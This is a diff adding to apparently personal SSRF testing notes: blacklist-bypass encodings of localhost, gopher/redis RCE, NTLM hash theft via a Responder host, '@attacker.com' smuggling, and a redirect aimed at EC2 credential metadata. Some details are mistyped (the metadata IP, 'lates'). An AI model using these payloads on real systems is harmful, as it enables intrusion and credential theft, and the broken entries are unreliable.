@@ -1,3 +1,104 @@
+
+Check differetn Shemes :
+	http, https, file, ftp, gopher, ssh
+		file,ftp can lead to local filesytem acces
+		file:// netdoc:// dict:// gopher:// jar:// ldap://
+		goher + redis = likely RCE
+------------------------------------------------------------
+Open redirect
+	When SSRF is Limited to a specific domain
+	Check if an endpoint is vulnerable by hitting redirect within th app and wheather it follows
+	Try all redirct status codes (301,302,303,307,308)
+	
+------------------------------------------------------------
+URL Structure
+	How is the URL formated
+		Using @ symbole, backslashes where unexcpected, smuggle fter : in port
+------------------------------------------------------------
+URL encode
+	Mostly 1x,2x but also 3x
+------------------------------------------------------------
+Regex validation
+	a.domain.com can match aXdomain.com
+	if goes thru buy domain and point boom
+------------------------------------------------------------
+Semi-internal hosts
+	if localhosts or other Private IP not hittable
+	try hit servers that are in the DMZ and not external accessabile
+	might not have protection from internal sources
+------------------------------------------------------------
+Hitting Non Http such as ssh
+	weird error response
+	http can interact with smtp
+		Articel: Hacking the Hackers: Leveraging an SSRF in HackerTarget	
+------------------------------------------------------------
+Different localhost Adresses
+	to avoid simple blacklists //https://github.com/vysecurity/IPFuscator
+	0.0.0.0 127.0.0.2 127.127.127.127 localhost 127.0.0.1
+	IPv6 adresses
+	octal and other ip encodings examples for 127.0.0.1:
+		0 compression : 127.1  oder 127.0.0000000000000000000000000000001
+		Octal: 0177.0.0.01 add as many leading 0 
+	Hexadecimal notaion:
+		0x7f.0x0.0x0.0x1     0x7f000001       add any hex values to the left e.g. 0xBAAAaaaaaaaaaaaaaa7f000001
+	Decimal Notaion 2130706433
+	Binary Notaion:
+		01111111000000000000000000000001
+	Mixed Notaion:
+		00000000000000000000000000000000000000000000000000177.1   0x7f.1  127.0x1
+		172.14263982 0254.0xd9a6ae 0xac.000000000000000000331.0246.174 0331.14263982
+	IPv6:
+		0000000000000:0000:0000:0000:0000:00000000000000:0000:1
+		0000:0000:0000:0000:0000:0000:0000:0001
+		0:0:0:0:0:0:0:1
+		0:0:0:0::0:0:1
+	URL encoded:
+		http://%31%32%37%2E%30%2E%30%2E%31
+		http://%2531%2532%2537%252E%2530%252E%2530%252E%2531
+		http://%252531%252532%252537%25252E%252530%25252E%252530%25252E%252531
+		http://[%3A%3A%31]
+------------------------------------------------------------
+Windows Target:
+	Trouble hitting internal Services
+	Steal NTLM hases with Responder:
+		/vulnerable?url=http://your-responder-host
+		https://github.com/SpiderLabs/Responder
+
+------------------------------------------------------------
+AWS Instance:
+	If 169.254.169.254 not reachable try:
+	instance-data e.g. http://instance-data
+------------------------------------------------------------
+Checking for Kubernetes
+	Burp history ".default.svc" or ".cluster.local"
+	Kubernetes API: https://kubernetes.default.svc
+	
+	In Kubernetes brute-force for:
+	HOSTNAME.<some-namespace>.svc.cluster.local
+		e.g. FUZZ.default.svc.cluster.local
+			wordlist: scrape helm charts from ArtifactHub
+------------------------------------------------------------
+Cant supply full URL >>> still SSRF
+	IF input is used to build URL
+	what the structure
+		Use different Characters: @ ? # ;
+	Example:
+		GET /vulnerable/endpoint?p=/path
+		Host: example.com
+		Connection close
+		|> app fetches http://internal-services/path
+	
+		GET /vulnerable/endpoint?p=@attacker.com
+		Host:example.com
+		Connection close
+		
+		|> app fetches http://internal-services@attacker.com 
+------------------------------------------------------------
+IF we need Path Trevaersal
+	eg fetch /api/v1 user /api/v1/../../
+	with redirect prob get ssrf
+------------------------------------------------------------
+
 HTTP body:
 	server=sub.server.asd@§server§#
 	zB 
@@ -5,10 +106,11 @@ HTTP body:
 	to
 	server=stock.store.com@internal-api.store.com#
 
-
+------------------------------------------------------------
 Fuzz link(0xp.cc) list parameters
 if somewhere false DNS response GOOD
-
+------------------------------------------------------------
 
 Force Redirect:
 ssrf.localdomain.pw/custom-30x/?301&url=http://196.254.196.254/lates/meta-data/identity-credentials/ec2/security-credentials/ec-instance&Action=ListTopics&appId=oegw3x
+------------------------------------------------------------
